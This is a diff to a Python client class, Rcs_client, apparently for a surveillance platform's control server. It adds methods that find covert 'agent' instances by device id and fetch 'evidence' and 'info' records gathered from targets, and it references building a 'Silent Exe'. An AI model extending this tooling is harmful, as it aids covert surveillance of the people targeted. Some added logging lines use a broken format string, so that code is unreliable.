@@ -37,7 +37,7 @@ class Rcs_client:
         @returns response page
         """
         try:
-            print "calling link: %s" % link
+            #print "calling link: %s" % link
             req = urllib2.Request(link)
             req.add_header('Accept-encoding', 'gzip')
 
@@ -100,7 +100,7 @@ class Rcs_client:
 
     def _call_get(self, api_name):
         link = 'https://%s/%s' % (self.host, api_name)
-        logging.debug("_call_get: %s" % link)
+        #logging.debug("_call_get: %s" % link)
         resp = self._get_response(link, self.cookie)
         result = json.loads(resp)
         return result
@@ -209,9 +209,19 @@ class Rcs_client:
         """ gets the instances id of an operation, matching the ident """
         logging.debug("lookin for instances with target: %s" % name)
         agents = self._call_get('agent')
-        logging.debug("agents: %s" % agents)
+        #logging.debug("agents: %s" % agents)
         #pp.pprint(agents)
         ret = [op for op in agents if name in op['name'] and op['_kind'] == 'agent']
+        return ret
+
+    def instances_by_deviceid(self, deviceid, target_id):
+        """ gets the instances id of an operation, matching the ident """
+        logging.debug("lookin for instances with deviceid: %s" % deviceid)
+        agents = self._call_get('agent')
+
+        ret = [op for op in agents
+               if 'stat' in op and 'device' in op['stat'] and deviceid in op['stat']['device']
+               and op['_kind'] == 'agent' and target_id in op['path']]
         return ret
 
     def agents(self, target_id):
@@ -346,8 +356,21 @@ class Rcs_client:
     def blacklist(self):
         return self._call_post('agent/blacklist')
 
-    def _evidences(self, target):
-        pass
+    def evidences_by_instance(self, instance_id, filter_type=None, filter_value=None):
+        logging.debug("evidences_by_instance: %s,%s,%s" %( instance_id, filter_type, filter_value))
+        if filter_type and filter_value:
+            f = {filter_type: filter_value, "agent": instance_id, 'date':'dr'}
+
+        else:
+            f = { "agent": instance_id, 'date':'dr'}
+
+        filter = urllib2.quote(json.dumps(f))
+        link = 'https://%s/evidence?filter=%s' % (self.host, filter)
+
+        resp = self._get_response(link, self.cookie)
+        result = json.loads(resp)
+        logging.debug("results: " % result)
+        return result
 
     def evidences(self, target_id, instance_id, filter_type=None, filter_value=None):
         """ Get evidences of given agent and target
@@ -376,6 +399,31 @@ class Rcs_client:
         logging.debug("results: " % result)
         return result
 
+    def infos(self, target_id, instance_id, filter_type=None, filter_value=None):
+        """ Get info of given agent and target
+        @param target
+        @param agent
+        @param type (if None all types should be returned)
+
+        date: '24h' 'week' 'month' 'now'
+        dr e da sono per il :date
+        gli altri sono per il :from :to
+        dr -> date received, da -> date acquired
+
+        """
+        logging.debug("info: %s,%s,%s,%s" %(target_id, instance_id, filter_type, filter_value))
+        if filter_type and filter_value:
+            f = {filter_type: filter_value, "target": target_id, "agent": instance_id, 'date':'dr'}
+        else:
+            f = {"target": target_id, "agent": instance_id, 'date':'dr'}
+
+        filter = urllib2.quote(json.dumps(f))
+        link = 'https://%s/evidence/info?filter=%s' % (self.host, filter)
+
+        resp = self._get_response(link, self.cookie)
+        result = json.loads(resp)
+        logging.debug("results: " % result)
+        return result
 
     def build(self, factory, params, out_file):
         """ Build Silent Exe
